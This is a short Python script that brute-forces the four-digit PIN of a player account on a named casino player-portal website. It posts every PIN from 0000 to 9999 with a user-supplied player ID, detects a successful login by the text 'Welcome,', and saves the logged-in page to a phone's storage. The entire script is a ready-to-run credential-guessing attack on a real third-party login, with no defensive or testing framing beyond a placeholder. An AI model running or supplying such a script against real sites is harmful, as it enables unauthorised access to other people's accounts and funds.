import requests

player_id = "PUT YOUR USERNAME/INFO"
url = "https://playerportal.jresortreno.com/"
site_id = "SITE ID OF THE URL YOURE TESTING"

for pin in range(0000, 10000):  # 0000 to 9999 inclusive
    pin_str = str(pin).zfill(4)
    data = {
        "player_id": player_id,
        "player_pin": pin_str,
        "site_id": site_id
    }
    try:
        response = requests.post(url, data=data, timeout=10)
        if "Welcome," in response.text:
            print(f"I AM BRUTE: {pin_str}")
            with open(f"/storage/emulated/0/Documents/response_{pin_str}.txt", "w", encoding="utf-8") as f:
                f.write(response.text)
            break
        elif "The Player ID or PIN are incorrect" in response.text:
            print(f"PIN {pin_str} incorrect")
        else:
            print(f"PIN {pin_str}: Unable to determine result.")
    except Exception as e:
        print(f"PIN {pin_str}: Error: {e}")
